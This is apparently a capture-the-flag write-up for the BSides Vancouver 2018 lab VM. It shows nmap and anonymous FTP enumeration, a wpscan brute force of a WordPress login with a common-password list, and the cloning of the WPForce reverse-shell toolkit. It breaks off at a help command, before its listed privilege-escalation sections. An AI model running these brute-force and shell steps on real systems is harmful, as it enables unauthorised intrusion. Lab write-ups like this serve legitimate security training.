#### BSides Vancouver: 2018

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [FTP Enumeration](#ftp-enumeration)
- [Web Enumeration](#web-enumeration)
- [Reverse Shell](#reverse-shell)
- [Privilege Escalation](#privilege-escalation)
- [Gaining root](#gaining-root)
- [SSH brute force anne](#ssh-brute-force-anne)

###### Attacker Info

```sh
root@kali:~/bsides# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:b0:a9:19 brd ff:ff:ff:ff:ff:ff
    inet 192.168.150.19/24 brd 192.168.150.255 scope global dynamic noprefixroute eth0
       valid_lft 86297sec preferred_lft 86297sec
    inet6 fe80::20c:29ff:feb0:a919/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
root@kali:~/bsides#
```

###### Nmap Scan

```sh
root@kali:~/bsides# nmap -sC -sV -oA bsides.nmap 192.168.150.18
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-02 16:51 EDT
Nmap scan report for 192.168.150.18
Host is up (0.00042s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 65534    65534        4096 Mar 03 17:52 public
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.150.19
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 2.3.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 85:9f:8b:58:44:97:33:98:ee:98:b0:c1:85:60:3c:41 (DSA)
|   2048 cf:1a:04:e1:7b:a3:cd:2b:d1:af:7d:b3:30:e0:a0:9d (RSA)
|_  256 97:e5:28:7a:31:4d:0a:89:b2:b0:25:81:d5:36:63:4c (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/backup_wordpress
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:0A:E2:BC (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
root@kali:~/bsides#
```

###### FTP Enumeration

```sh
root@kali:~/bsides# ftp 192.168.150.18
Connected to 192.168.150.18.
220 (vsFTPd 2.3.5)
Name (192.168.150.18:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Mar 03 17:52 public
226 Directory send OK.
ftp> cd public
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              31 Mar 03 17:52 users.txt.bk
226 Directory send OK.
ftp> get users.txt.bk
local: users.txt.bk remote: users.txt.bk
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for users.txt.bk (31 bytes).
226 Transfer complete.
31 bytes received in 0.00 secs (13.0658 kB/s)
ftp> exit
221 Goodbye.
root@kali:~/bsides#
```

```sh
root@kali:~/bsides# cat users.txt.bk
abatchy
john
mai
anne
doomguy

root@kali:~/bsides#
```

###### Web Enumeration

```
http://192.168.150.18
http://192.168.150.18/robots.txt
http://192.168.150.18/backup_wordpress/
http://192.168.150.18/backup_wordpress/wp-login.php
```

![](images/1.png)

![](images/2.png)

![](images/3.png)

![](images/4.png)

![](images/5.png)

![](images/6.png)

![](images/7.png)

```sh
root@kali:~/bsides# wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt
--2018-07-02 17:04:53--  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 83017 (81K) [text/plain]
Saving to: ‘10k-most-common.txt’

10k-most-common.txt                                100%[================================================================================================================>]  81.07K  --.-KB/s    in 0.04s

2018-07-02 17:04:53 (2.15 MB/s) - ‘10k-most-common.txt’ saved [83017/83017]

root@kali:~/bsides#
```

```sh
root@kali:~/bsides# wpscan -u http://192.168.150.18/backup_wordpress/ -w ~/bsides/10k-most-common.txt --username john
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.150.18/backup_wordpress/
[+] Started: Mon Jul  2 17:07:20 2018

[!] The WordPress 'http://192.168.150.18/backup_wordpress/readme.html' file exists exposing a version number
[+] Interesting header: LINK: </backup_wordpress/?rest_route=/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.2.22 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.3.10-1ubuntu3.26
[+] XML-RPC Interface available under: http://192.168.150.18/backup_wordpress/xmlrpc.php
[!] Includes directory has directory listing enabled: http://192.168.150.18/backup_wordpress/wp-includes/

[+] WordPress version 4.5 (Released on 2016-04-12) identified from meta generator, readme, links opml, stylesheets numbers, advanced fingerprinting
[!] 44 vulnerabilities identified from the version number

[!] Title: WordPress 4.2-4.5.1 - MediaElement.js Reflected Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8488
    Reference: https://wordpress.org/news/2016/05/wordpress-4-5-2/
    Reference: https://github.com/WordPress/WordPress/commit/a493dc0ab5819c8b831173185f1334b7c3e02e36
    Reference: https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4567
[i] Fixed in: 4.5.2

[!] Title: WordPress <= 4.5.1 - Pupload Same Origin Method Execution (SOME)
    Reference: https://wpvulndb.com/vulnerabilities/8489
    Reference: https://wordpress.org/news/2016/05/wordpress-4-5-2/
    Reference: https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8
    Reference: https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e
    Reference: http://avlidienbrunn.com/wp_some_loader.php
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566
[i] Fixed in: 4.5.2

[!] Title: WordPress 4.2-4.5.2 - Authenticated Attachment Name Stored XSS
    Reference: https://wpvulndb.com/vulnerabilities/8518
    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
    Reference: https://github.com/WordPress/WordPress/commit/4372cdf45d0f49c74bbd4d60db7281de83e32648
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5833
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5834
[i] Fixed in: 4.5.3

[!] Title: WordPress 3.6-4.5.2 - Authenticated Revision History Information Disclosure
    Reference: https://wpvulndb.com/vulnerabilities/8519
    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
    Reference: https://github.com/WordPress/WordPress/commit/a2904cc3092c391ac7027bc87f7806953d1a25a1
    Reference: https://www.wordfence.com/blog/2016/06/wordpress-core-vulnerability-bypass-password-protected-posts/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5835
[i] Fixed in: 4.5.3

[!] Title: WordPress 2.6.0-4.5.2 - Unauthorized Category Removal from Post
    Reference: https://wpvulndb.com/vulnerabilities/8520
    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
    Reference: https://github.com/WordPress/WordPress/commit/6d05c7521baa980c4efec411feca5e7fab6f307c
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5837
[i] Fixed in: 4.5.3

[!] Title: WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename
    Reference: https://wpvulndb.com/vulnerabilities/8615
    Reference: https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0
    Reference: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html
    Reference: http://seclists.org/fulldisclosure/2016/Sep/6
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7168
[i] Fixed in: 4.5.4

[!] Title: WordPress 2.8-4.6 - Path Traversal in Upgrade Package Uploader
    Reference: https://wpvulndb.com/vulnerabilities/8616
    Reference: https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/54720a14d85bc1197ded7cb09bd3ea790caa0b6e
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7169
[i] Fixed in: 4.5.4

[!] Title: WordPress 4.3-4.7 - Remote Code Execution (RCE) in PHPMailer
    Reference: https://wpvulndb.com/vulnerabilities/8714
    Reference: https://www.wordfence.com/blog/2016/12/phpmailer-vulnerability/
    Reference: https://github.com/PHPMailer/PHPMailer/wiki/About-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/24767c76d359231642b0ab48437b64e8c6c7f491
    Reference: http://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
    Reference: https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_phpmailer_host_header
[i] Fixed in: 4.7.1

[!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php
    Reference: https://wpvulndb.com/vulnerabilities/8716
    Reference: https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488
[i] Fixed in: 4.5.5

[!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback
    Reference: https://wpvulndb.com/vulnerabilities/8718
    Reference: https://www.mehmetince.net/low-severity-wordpress/
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5490
[i] Fixed in: 4.5.5

[!] Title: WordPress <= 4.7 - Post via Email Checks mail.example.com by Default
    Reference: https://wpvulndb.com/vulnerabilities/8719
    Reference: https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5491
[i] Fixed in: 4.5.5

[!] Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)
    Reference: https://wpvulndb.com/vulnerabilities/8720
    Reference: https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5492
[i] Fixed in: 4.5.5

[!] Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)
    Reference: https://wpvulndb.com/vulnerabilities/8721
    Reference: https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5493
[i] Fixed in: 4.5.5

[!] Title: WordPress 4.2.0-4.7.1 - Press This UI Available to Unauthorised Users
    Reference: https://wpvulndb.com/vulnerabilities/8729
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
    Reference: https://github.com/WordPress/WordPress/commit/21264a31e0849e6ff793a06a17de877dd88ea454
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5610
[i] Fixed in: 4.5.6

[!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8730
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
    Reference: https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611
[i] Fixed in: 4.5.6

[!] Title: WordPress 4.3.0-4.7.1 - Cross-Site Scripting (XSS) in posts list table
    Reference: https://wpvulndb.com/vulnerabilities/8731
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
    Reference: https://github.com/WordPress/WordPress/commit/4482f9207027de8f36630737ae085110896ea849
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5612
[i] Fixed in: 4.5.6

[!] Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata
    Reference: https://wpvulndb.com/vulnerabilities/8765
    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7
    Reference: https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html
    Reference: http://seclists.org/oss-sec/2017/q1/563
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6814
[i] Fixed in: 4.5.7

[!] Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation
    Reference: https://wpvulndb.com/vulnerabilities/8766
    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6815
[i] Fixed in: 4.5.7

[!] Title: WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
    Reference: https://wpvulndb.com/vulnerabilities/8768
    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
    Reference: https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817
[i] Fixed in: 4.5.7

[!] Title: WordPress 4.2-4.7.2 - Press This CSRF DoS
    Reference: https://wpvulndb.com/vulnerabilities/8770
    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/263831a72d08556bc2f3a328673d95301a152829
    Reference: https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_press_this_function_allows_dos.html
    Reference: http://seclists.org/oss-sec/2017/q1/562
    Reference: https://hackerone.com/reports/153093
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6819
[i] Fixed in: 4.5.7

[!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
    Reference: https://wpvulndb.com/vulnerabilities/8807
    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
    Reference: https://core.trac.wordpress.org/ticket/25239
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295

[!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation
    Reference: https://wpvulndb.com/vulnerabilities/8815
    Reference: https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066
[i] Fixed in: 4.5.9

[!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC
    Reference: https://wpvulndb.com/vulnerabilities/8816
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062
[i] Fixed in: 4.5.9

[!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks
    Reference: https://wpvulndb.com/vulnerabilities/8817
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065
[i] Fixed in: 4.5.9

[!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF
    Reference: https://wpvulndb.com/vulnerabilities/8818
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67
    Reference: https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064
[i] Fixed in: 4.5.9

[!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS
    Reference: https://wpvulndb.com/vulnerabilities/8819
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6
    Reference: https://hackerone.com/reports/203515
    Reference: https://hackerone.com/reports/203515
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061
[i] Fixed in: 4.5.9

[!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS & CSRF
    Reference: https://wpvulndb.com/vulnerabilities/8820
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063
[i] Fixed in: 4.5.9

[!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8905
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
    Reference: https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec
[i] Fixed in: 4.5.10

[!] Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection
    Reference: https://wpvulndb.com/vulnerabilities/8906
    Reference: https://medium.com/websec/wordpress-sqli-bbb2afcc8e94
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
    Reference: https://wpvulndb.com/vulnerabilities/8905
[i] Fixed in: 4.7.5

[!] Title: WordPress 2.9.2-4.8.1 - Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/8910
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41398
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725
[i] Fixed in: 4.5.10

[!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping
    Reference: https://wpvulndb.com/vulnerabilities/8911
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41457
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719
[i] Fixed in: 4.5.10

[!] Title: WordPress 4.4-4.8.1 - Cross-Site Scripting (XSS) in oEmbed
    Reference: https://wpvulndb.com/vulnerabilities/8913
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41448
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14724
[i] Fixed in: 4.5.10

[!] Title: WordPress 4.2.3-4.8.1 - Authenticated Cross-Site Scripting (XSS) in Visual Editor
    Reference: https://wpvulndb.com/vulnerabilities/8914
    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/41395
    Reference: https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726
[i] Fixed in: 4.5.10

[!] Title: WordPress <= 4.8.2 - $wpdb->prepare() Weakness
    Reference: https://wpvulndb.com/vulnerabilities/8941
    Reference: https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/
    Reference: https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d
    Reference: https://twitter.com/ircmaxell/status/923662170092638208
    Reference: https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510
[i] Fixed in: 4.5.11

[!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload
    Reference: https://wpvulndb.com/vulnerabilities/8966
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092
[i] Fixed in: 4.5.12

[!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping
    Reference: https://wpvulndb.com/vulnerabilities/8967
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094
[i] Fixed in: 4.5.12

[!] Title: WordPress 4.3.0-4.9 - HTML Language Attribute Escaping
    Reference: https://wpvulndb.com/vulnerabilities/8968
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/3713ac5ebc90fb2011e98dfd691420f43da6c09a
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17093
[i] Fixed in: 4.5.12

[!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing
    Reference: https://wpvulndb.com/vulnerabilities/8969
    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091
[i] Fixed in: 4.5.12

[!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/9006
    Reference: https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850
    Reference: https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/ticket/42720
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776
[i] Fixed in: 4.5.13

[!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
    Reference: https://wpvulndb.com/vulnerabilities/9021
    Reference: https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
    Reference: https://github.com/quitten/doser.py
    Reference: https://thehackernews.com/2018/02/wordpress-dos-exploit.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389

[!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
    Reference: https://wpvulndb.com/vulnerabilities/9053
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
[i] Fixed in: 4.5.14

[!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
    Reference: https://wpvulndb.com/vulnerabilities/9054
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
[i] Fixed in: 4.5.14

[!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
    Reference: https://wpvulndb.com/vulnerabilities/9055
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
[i] Fixed in: 4.5.14

[!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion (unpatched)
    Reference: https://wpvulndb.com/vulnerabilities/9100
    Reference: https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
    Reference: http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895

[+] WordPress theme in use: twentysixteen - v1.2

[+] Name: twentysixteen - v1.2
 |  Last updated: 2018-05-17T00:00:00.000Z
 |  Location: http://192.168.150.18/backup_wordpress/wp-content/themes/twentysixteen/
 |  Readme: http://192.168.150.18/backup_wordpress/wp-content/themes/twentysixteen/readme.txt
[!] The version is out of date, the latest version is 1.5
 |  Style URL: http://192.168.150.18/backup_wordpress/wp-content/themes/twentysixteen/style.css
 |  Referenced style.css: wp-content/themes/twentysixteen/style.css
 |  Theme Name: Twenty Sixteen
 |  Theme URI: https://wordpress.org/themes/twentysixteen/
 |  Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthe...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating plugins from passive detection ...
[+] No plugins found
[+] Starting the password brute forcer
  [!] ERROR: We received an unknown response for login: john and password: enigma
  Brute Forcing 'john' Time: 00:22:39 <=============================================================================================================================  > (9998 / 10001) 99.97%  ETA: 00:00:00

  +----+-------+------+----------+
  | Id | Login | Name | Password |
  +----+-------+------+----------+
  |    | john  |      |          |
  +----+-------+------+----------+

[+] Finished: Mon Jul  2 17:30:04 2018
[+] Requests Done: 10050
[+] Memory used: 41.695 MB
[+] Elapsed time: 00:22:43
root@kali:~/bsides#
```

###### Reverse Shell

```sh
root@kali:~/bsides# pip install requests
Requirement already satisfied: requests in /usr/lib/python2.7/dist-packages (2.18.4)
root@kali:~/bsides#
```

![](images/8.png)

![](images/9.png)

```sh
root@kali:~/bsides# git clone https://github.com/n00py/WPForce.git
Cloning into 'WPForce'...
remote: Counting objects: 244, done.
remote: Total 244 (delta 0), reused 0 (delta 0), pack-reused 244
Receiving objects: 100% (244/244), 133.12 KiB | 1.37 MiB/s, done.
Resolving deltas: 100% (124/124), done.
root@kali:~/bsides# cd WPForce/
root@kali:~/bsides/WPForce# ls -l
total 52
-rw-r--r-- 1 root root  1060 Jul  2 17:16 add_admin.js
-rw-r--r-- 1 root root  1305 Jul  2 17:16 LICENSE
-rw-r--r-- 1 root root  5210 Jul  2 17:16 README.md
-rw-r--r-- 1 root root  2969 Jul  2 17:16 reverse.zip
-rw-r--r-- 1 root root   555 Jul  2 17:16 shell.zip
-rw-r--r-- 1 root root  7998 Jul  2 17:16 wpforce.py
-rw-r--r-- 1 root root 17491 Jul  2 17:16 yertle.py
root@kali:~/bsides/WPForce#
```

```sh
root@kali:~/bsides/WPForce# python yertle.py -h
